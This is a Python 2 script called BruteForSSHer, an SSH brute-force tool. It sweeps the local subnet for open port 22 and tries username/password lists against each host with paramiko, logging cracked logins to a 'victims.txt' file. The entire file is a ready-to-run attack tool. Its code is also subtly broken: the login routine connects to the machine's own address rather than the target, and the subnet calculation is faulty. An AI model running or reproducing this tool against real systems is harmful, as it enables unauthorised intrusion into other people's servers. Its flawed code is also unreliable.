#!/usr/bin/env  python
"""
    BruteForSSHer
    Copyright 2018, Raviv Raz.
    BruteForSSHer is distributed under the terms of the GNU General Public License
    BruteForSSHer is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import paramiko
from os import popen
from re import findall
import socket 
from sys import argv

class ssh_client:
  def __init__(self,interface):
    self.users = open("users.txt").read().split()
    self.passwords = open("passwords.txt").read().split()
    self.port = 22
    self.interface = interface
    self.host = ""
    try:
      self.host = findall('[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}',popen('ifconfig '+self.interface).read())[0]
    except IndexError:
      print "\n[X] No IP address found on %s\n"%self.interface
      raise SystemExit
    print "[!] Using %(interface)s on %(ip_addr)s to scan subnet"%{"interface":interface,"ip_addr":self.host}
    self.hostnames = [self.host[:-self.host.find(".")+1]+str(ip) for ip in range(1,255)]
    self.hostnames.remove(self.host)
    self.username = ""
    self.password = ""
    self.hostkeytype = 'ssh-rsa'
  def set_credentials(self,user,passwd):
    self.username = user
    self.password = passwd
  def connect(self):
    self.t = paramiko.Transport((self.host, self.port))
    self.t.connect(username=self.username, password=self.password)
  def close(self):
    self.t.close()
  def ping(self,host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host,self.port))
    if result == 0: return True
    else: return False
  def attack(self):
    counter = 0
    for hostname in self.hostnames:
      if not self.ping(hostname):
        print "[X] %s not responsive"%hostname
        pass
      else:
        for user in self.users:
          for passwd in self.passwords:
            counter += 1
            # print "[!] Trying %(user)s / %(password)s against %(hostname)s"%{"user":user,"password":passwd,"hostname":hostname}
            self.set_credentials(user,passwd)
            try: 
              self.connect()
              print "[V] Login successful after %i attempts"%counter
              output = open("victims.txt","a")
              output.write("User= %(user)s , Password= %(password)s , Host= %(hostname)s\n"%{"user":user,"password":passwd,"hostname":hostname})
              output.close()
              self.close()
              pass
            except: 
             pass
        print "[X] Attack on %s failed after %i attempts"%(hostname,counter)


if __name__ == "__main__":
  if len(argv)<2:
    print "\nUsage: %s <network-interface>\n"%argv[0]
    print "Here are some available network interfaces:\n"
    interfaces = popen("ifconfig -a").read()
    for interface in set(findall("en[0-9]+",interfaces)):
      print interface
    for interface in set(findall("eth[0-9]+", interfaces)):
      print interface
    for interface in set(findall("wlan[0-9]+", interfaces)):
      print interface
    print ""
    raise SystemExit
  else:
    cli = ssh_client(interface=argv[1].strip())
    cli.attack()
